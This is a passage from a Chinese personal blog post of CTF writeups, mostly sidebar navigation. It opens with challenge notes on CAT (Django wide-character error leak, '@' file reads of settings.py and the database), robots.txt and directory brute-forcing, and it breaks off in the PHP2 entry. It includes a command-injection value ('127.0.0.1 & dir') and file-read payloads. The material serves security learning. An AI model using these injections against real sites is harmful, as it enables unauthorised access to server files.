class="nav-number">3.43.</span> <span class="nav-text">lottery&#x2F;XCTF(3)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-x2F-%E6%B3%B0%E5%B1%B1%E6%9D%AF-4"><span class="nav-number">3.44.</span> <span class="nav-text">文件包含&#x2F;泰山杯(4)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlatScience-x2F-Hack-lu-2017-4"><span class="nav-number">3.45.</span> <span class="nav-text">FlatScience&#x2F;Hack.lu-2017(4)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Confusion1-x2F-XCTF-4"><span class="nav-number">3.45.1.</span> <span class="nav-text">Confusion1&#x2F;XCTF(4)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFHUB"><span class="nav-number">4.</span> <span class="nav-text">CTFHUB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vim%E7%BC%93%E5%AD%98"><span class="nav-number">4.1.</span> <span class="nav-text">Vim缓存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git%E6%B3%84%E9%9C%B2-Log"><span class="nav-number">4.2.</span> <span class="nav-text">Git泄露-Log</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git%E6%B3%84%E9%9C%B2-Stash"><span class="nav-number">4.3.</span> <span class="nav-text">Git泄露-Stash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git%E6%B3%84%E9%9C%B2-Index"><span class="nav-number">4.4.</span> <span class="nav-text">Git泄露-Index</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVN%E6%B3%84%E9%9C%B2"><span class="nav-number">4.5.</span> <span class="nav-text">SVN泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HG%E6%B3%84%E9%9C%B2"><span class="nav-number">4.6.</span> <span class="nav-text">HG泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">4.7.</span> <span class="nav-text">弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="nav-number">4.8.</span> <span class="nav-text">默认口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%94%E9%80%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="nav-number">5.</span> <span class="nav-text">联通网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-RRRCE"><span class="nav-number">5.1.</span> <span class="nav-text">WEB-RRRCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-SearchBar"><span class="nav-number">5.2.</span> <span class="nav-text">WEB-SearchBar</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">6.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">6.1.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-1"><span class="nav-number">7.</span> <span class="nav-text">攻防世界</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A0%E5%BA%93%E8%B7%91%E8%B7%AF-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-1"><span class="nav-number">7.1.</span> <span class="nav-text">删库跑路-&#x2F;XSCTF联合招新赛(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%AF%E6%92%92%E5%A4%A7%E5%B8%9D%E5%9C%A8%E5%9F%B9%E6%A0%B9%E9%87%8C%E8%97%8F%E4%BA%86%E4%BB%80%E4%B9%88-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-1"><span class="nav-number">7.2.</span> <span class="nav-text">凯撒大帝在培根里藏了什么&#x2F;XSCTF联合招新赛(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84base%E7%BC%96%E7%A0%81-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-1"><span class="nav-number">7.3.</span> <span class="nav-text">简单的base编码&#x2F;XSCTF联合招新赛(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E8%87%AA%E9%93%B6%E6%B2%B3%E7%9A%84%E4%BF%A1%E5%8F%B7-x2F-%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF-1"><span class="nav-number">7.4.</span> <span class="nav-text">来自银河的信号&#x2F;江苏工匠杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#steg%E6%B2%A1%E6%9C%89py-x2F-%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF-1"><span class="nav-number">7.5.</span> <span class="nav-text">steg没有py&#x2F;江苏工匠杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%88%BA%E5%AE%A2%EF%BC%81-x2F-%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF-1"><span class="nav-number">7.6.</span> <span class="nav-text">*时间刺客！&#x2F;江苏工匠杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%8B%E9%9B%AA%E7%9C%8B%E9%9B%AA%E7%9C%8B%E9%9B%AA-x2F-%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF-1"><span class="nav-number">7.7.</span> <span class="nav-text">看雪看雪看雪&#x2F;江苏工匠杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902-x2F-CTF-1"><span class="nav-number">7.8.</span> <span class="nav-text">流量分析2&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nice-bgm-x2F-CTF-1"><span class="nav-number">7.9.</span> <span class="nav-text">nice_bgm&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fakezip-x2F-%E5%AE%9C%E5%85%B4%E7%BD%91%E4%BF%A1%E5%8A%9E-1"><span class="nav-number">7.10.</span> <span class="nav-text">fakezip&#x2F;宜兴网信办(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Check-x2F-CTF-1"><span class="nav-number">7.11.</span> <span class="nav-text">Check&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wire1-x2F-CTF-1"><span class="nav-number">7.12.</span> <span class="nav-text">Wire1&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Encode-x2F-CTF-1"><span class="nav-number">7.13.</span> <span class="nav-text">Encode&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-misc-x2F-%E9%9D%92%E5%B2%9B%E5%8D%8E%E8%83%BD-1"><span class="nav-number">7.14.</span> <span class="nav-text">1-misc&#x2F;青岛华能(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A2%8E%E7%BA%B8%E6%9C%BA11-x2F-CTF-1"><span class="nav-number">7.15.</span> <span class="nav-text">碎纸机11&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Let-god-knows-x2F-CTF-1"><span class="nav-number">7.16.</span> <span class="nav-text">Let_god_knows&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc2-1-x2F-CTF-1"><span class="nav-number">7.17.</span> <span class="nav-text">misc2-1&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pcap1-x2F-CTF-1"><span class="nav-number">7.18.</span> <span class="nav-text">pcap1&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#running-x2F-CTF-1"><span class="nav-number">7.19.</span> <span class="nav-text">running&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901-x2F-GA-1"><span class="nav-number">7.20.</span> <span class="nav-text">流量分析1&#x2F;GA(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B4%A5%E9%97%A8%E6%9D%AF2021-m1-x2F-%E6%B4%A5%E9%97%A8%E6%9D%AF-1"><span class="nav-number">7.21.</span> <span class="nav-text">津门杯2021-m1&#x2F;津门杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#m0-01-x2F-%E5%A4%AA%E6%B9%96%E6%9D%AF-1"><span class="nav-number">7.22.</span> <span class="nav-text">m0_01&#x2F;太湖杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#miss-01-x2F-%E5%A4%AA%E6%B9%96%E6%9D%AF-1"><span class="nav-number">7.23.</span> <span class="nav-text">miss_01&#x2F;太湖杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ditf-x2F-%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9B-1"><span class="nav-number">7.24.</span> <span class="nav-text">Ditf&#x2F;安恒9月赛(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#a-good-idea-x2F-NJUPT-CTF-1"><span class="nav-number">7.25.</span> <span class="nav-text">a_good_idea&#x2F;NJUPT-CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aesop-secret-x2F-ISCC-1"><span class="nav-number">7.26.</span> <span class="nav-text">Aesop_secret&#x2F;ISCC(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#normal-png-1"><span class="nav-number">7.27.</span> <span class="nav-text">normal_png(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#glance-50-x2F-CTF-1"><span class="nav-number">7.28.</span> <span class="nav-text">glance-50&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hit-the-core-x2F-CTF-1"><span class="nav-number">7.29.</span> <span class="nav-text">hit-the-core&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverseMe-x2F-XCTF-1"><span class="nav-number">7.30.</span> <span class="nav-text">reverseMe&#x2F;XCTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc-pic-again-1"><span class="nav-number">7.31.</span> <span class="nav-text">misc_pic_again(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hong-1"><span class="nav-number">7.32.</span> <span class="nav-text">hong(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Test-flag-please-ignore-x2F-CTF-1"><span class="nav-number">7.33.</span> <span class="nav-text">Test-flag-please-ignore&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Janos-the-Ripper-x2F-CTF-1"><span class="nav-number">7.34.</span> <span class="nav-text">János-the-Ripper&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Erik-Baleog-and-Olaf-x2F-CTF-1"><span class="nav-number">7.35.</span> <span class="nav-text">Erik-Baleog-and-Olaf&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#can-has-stdio-x2F-CTF-1"><span class="nav-number">7.36.</span> <span class="nav-text">can_has_stdio?&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Training-Stegano-1-1"><span class="nav-number">7.37.</span> <span class="nav-text">Training-Stegano-1(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-transfer-x2F-XCTF-1"><span class="nav-number">7.38.</span> <span class="nav-text">simple_transfer&#x2F;XCTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2017-Dating-in-Singapore-x2F-XCTF-1"><span class="nav-number">7.39.</span> <span class="nav-text">2017_Dating_in_Singapore&#x2F;XCTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pure-color-x2F-CTF-1"><span class="nav-number">7.40.</span> <span class="nav-text">pure_color&#x2F;CTF(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B8-x2F-%E4%B8%96%E5%AE%89%E6%9D%AF-1"><span class="nav-number">7.41.</span> <span class="nav-text">心仪的公司&#x2F;世安杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A2-x2F-%E4%B8%96%E5%AE%89%E6%9D%AF-1"><span class="nav-number">7.42.</span> <span class="nav-text">适合作为桌面&#x2F;世安杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Banmabanma-x2F-%E4%B8%96%E5%AE%89%E6%9D%AF-1"><span class="nav-number">7.43.</span> <span class="nav-text">Banmabanma&#x2F;世安杯(1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E6%98%AF%E9%98%B3%E9%97%B4%E9%A2%98-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-2"><span class="nav-number">7.44.</span> <span class="nav-text">真是阳间题&#x2F;XSCTF联合招新赛(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-Math-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-2"><span class="nav-number">7.45.</span> <span class="nav-text">Simple-Math&#x2F;XSCTF联合招新赛(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BotW-x2F-XSCTF%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B-2"><span class="nav-number">7.46.</span> <span class="nav-text">BotW-&#x2F;XSCTF联合招新赛(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc1-x2F-DDCTF-2"><span class="nav-number">7.47.</span> <span class="nav-text">misc1&#x2F;DDCTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#low-x2F-%E4%B8%96%E5%AE%89%E6%9D%AF-2"><span class="nav-number">7.48.</span> <span class="nav-text">low&#x2F;世安杯(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A5%9E%E5%A5%87%E7%9A%84Modbus-x2F-XCTF-2"><span class="nav-number">7.49.</span> <span class="nav-text">神奇的Modbus&#x2F;XCTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%B0%8F%E7%9A%84PDF-x2F-CTF-2"><span class="nav-number">7.50.</span> <span class="nav-text">小小的PDF&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cephalopod-x2F-XCTF-2"><span class="nav-number">7.51.</span> <span class="nav-text">Cephalopod&#x2F;XCTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Excaliflag-x2F-CTF-2"><span class="nav-number">7.52.</span> <span class="nav-text">Excaliflag&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-x2F-WDCTF-2"><span class="nav-number">7.53.</span> <span class="nav-text">4-2&#x2F;WDCTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easycap-x2F-CTF-2"><span class="nav-number">7.54.</span> <span class="nav-text">easycap&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage1-x2F-XCTF-2"><span class="nav-number">7.55.</span> <span class="nav-text">stage1&#x2F;XCTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Miscellaneous-200-x2F-CTF-2"><span class="nav-number">7.56.</span> <span class="nav-text">Miscellaneous-200&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hear-with-your-Eyes-x2F-CTF-2"><span class="nav-number">7.57.</span> <span class="nav-text">Hear-with-your-Eyes&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-Message-x2F-CTF-2"><span class="nav-number">7.58.</span> <span class="nav-text">Hidden-Message&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recover-Deleted-File-x2F-CTF-2"><span class="nav-number">7.59.</span> <span class="nav-text">Recover-Deleted-File&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-this-x2F-CTF-2"><span class="nav-number">7.60.</span> <span class="nav-text">What-is-this&#x2F;CTF(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BE%88%E6%99%AE%E9%80%9A%E7%9A%84%E6%95%B0%E7%8B%AC-x2F-ISCC-2"><span class="nav-number">7.61.</span> <span class="nav-text">很普通的数独&#x2F;ISCC(2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Become-a-Rockstar-x2F-NJUPT-CTF-2"><span class="nav-number">7.62.</span> <span class="nav-text">Become_a_Rockstar&#x2F;NJUPT-CTF(2)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFHUB-1"><span class="nav-number">8.</span> <span class="nav-text">CTFHUB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL%E6%B5%81%E9%87%8F"><span class="nav-number">8.1.</span> <span class="nav-text">MYSQL流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis%E6%B5%81%E9%87%8F"><span class="nav-number">8.2.</span> <span class="nav-text">Redis流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MongoDB%E6%B5%81%E9%87%8F"><span class="nav-number">8.3.</span> <span class="nav-text">MongoDB流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP-Data"><span class="nav-number">8.4.</span> <span class="nav-text">ICMP-Data</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP-Length"><span class="nav-number">8.5.</span> <span class="nav-text">ICMP-Length</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP-LengthBinary"><span class="nav-number">8.6.</span> <span class="nav-text">ICMP-LengthBinary</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rikka</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="/2022/08/31/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA" title="&#x2F;2022&#x2F;08&#x2F;31&#x2F;奇奇怪怪">奇奇怪怪</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="/2022/09/01/Genshin/" title="&#x2F;2022&#x2F;09&#x2F;01&#x2F;Genshin&#x2F;">Genshin</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="/2022/10/25/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" title="&#x2F;2022&#x2F;10&#x2F;25&#x2F;漏洞原理&#x2F;">漏洞原理</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="/2022/08/30/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/" title="&#x2F;2022&#x2F;08&#x2F;30&#x2F;常用工具&#x2F;">常用工具</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="/2022/08/30/WRITEUP" title="&#x2F;2022&#x2F;08&#x2F;30&#x2F;WRITEUP">Writeup</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="/2022/08/30/DVWA/" title="&#x2F;2022&#x2F;08&#x2F;30&#x2F;DVWA&#x2F;">DVWA</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/rikka5201" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/30/WRITEUP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rikka">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rikka的博客">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="WRITEUP | rikka的博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WRITEUP
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-30 11:20:57" itemprop="dateCreated datePublished" datetime="2022-08-30T11:20:57+08:00">2022-08-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-01-06 16:50:01" itemprop="dateModified" datetime="2023-01-06T16:50:01+08:00">2023-01-06</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>66k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:01</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>CTF的Writeup</center>

<span id="more"></span>

<h1 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p><a target="_blank" rel="noopener" href="https://www.nowcoder.com/">牛客网 - 互联网求职神器和备考学习平台</a></p>
<p><a target="_blank" rel="noopener" href="https://leetcode.cn/">力扣-LeetCode</a></p>
<p><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/">洛谷</a></p>
<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/">BugkuCTF - 练习平台</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.pediy.com/itembank.htm">看雪题库</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv12315967">愿安全人不在踩坑，一年多以来网络安全的学习经验</a></p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF在线评测</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">CTFHub</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="CAT-x2F-XCTF-4th-WHCTF-2017-4"><a href="#CAT-x2F-XCTF-4th-WHCTF-2017-4" class="headerlink" title="CAT&#x2F;XCTF 4th-WHCTF-2017(4)"></a>CAT&#x2F;XCTF 4th-WHCTF-2017(4)</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11572267.html">writeup</a><br>最开始看到这熟悉的界面，还以为是简单的命令注入，输入<code>127.0.0.1</code>发现的确是ping命令，但是当输入<code>127.0.0.1 &amp; dir</code>的时候报错，显示Invalid URL。然后就懵逼了，毫无下手之地。<br>查看大佬们的writeup之后发现，可以使用宽字符注入，即<code>url=%df</code>，然后他就会爆出html代码，把代码复制打开，就是报错原因和相关信息。<br>(django报错页面，将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。)<br><img data-src="https://img-blog.csdnimg.cn/32794d1fbf7a4d5fa3807a4b943b2c89.png" alt="在这里插入图片描述"><br>在这里可以看到pyhton path，第一行就是项目路径。<br><img data-src="https://img-blog.csdnimg.cn/98e09c135f234a44a70fec8f1db7c094.png" alt="在这里插入图片描述"><br>这里没看懂，不过大概意思是可以使用<code>@</code>读取文件内容<br>这里前面还有一个字典fuzz的操作，@没有被过滤<br><img data-src="https://img-blog.csdnimg.cn/f203f026631b4bf6b8dbf869970dca7b.png" alt="在这里插入图片描述"></p>
<p>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。<br>django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。即<code>/opt/api/api/settings.py</code><br>打开<code>url=@/opt/api/api/settings.py</code>也出现了一段html代码，复制打开可以看到<code>Name：/opt/api/database.sqlite3</code><br><img data-src="https://img-blog.csdnimg.cn/adfc5a5c6e96428dbfa68ce0df702a06.png" alt="在这里插入图片描述"><br>直接打开<code>url=@/opt/api/database.sqlite3</code>，直接搜索flag或ctf<br>搜索ctf获得结果<code>WHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p>
<h2 id="Training-WWW-Robots-1"><a href="#Training-WWW-Robots-1" class="headerlink" title="Training-WWW-Robots(1)"></a>Training-WWW-Robots(1)</h2><p>这是一个学习robots文件的题，直接在网址后加<code>/robots.txt</code>或者使用<a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/robots/">站长工具</a>进行robots检测。可以看到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>

<p><img data-src="https://img-blog.csdnimg.cn/c8804b9ef0d3464e93b9004c80c18aaf.png" alt="在这里插入图片描述"><br>那就直接打开<code>/fl0g.php</code>，就能看到flag<br><code>cyberpeace&#123;b03432652f32469133918d7f56ca2cf1&#125;</code></p>
<h2 id="PHP2-1"><a href="#PHP2-1" class="headerlink" title="PHP2(1)"></a>PHP2(1)</h2><p>你能登录这个网站吗？<br>没有思路，can can need<br>看了writeup才发现我忘了可以进行后台地址爆破<br>使用御剑或者dirsearch<br>(因为题目提示了php，那就只选php就行)<br><img data-src="https://img-blog.csdnimg.cn/9a1916437f544bfbbbb4c06b2e7215bc.png" alt="在这里插入图片描述"><br>dirsearch -u URL<br><img data-src="https://img-blog.csdnimg.cn/40366e096b32463bba7d09d4d821d9cf.png" alt="在这里插入图片描述"><br>这两个死活没用，看了一下，人家能爆出来<code>index.phps</code>？原来是自己加的。。<br>打开出现下述代码</p>
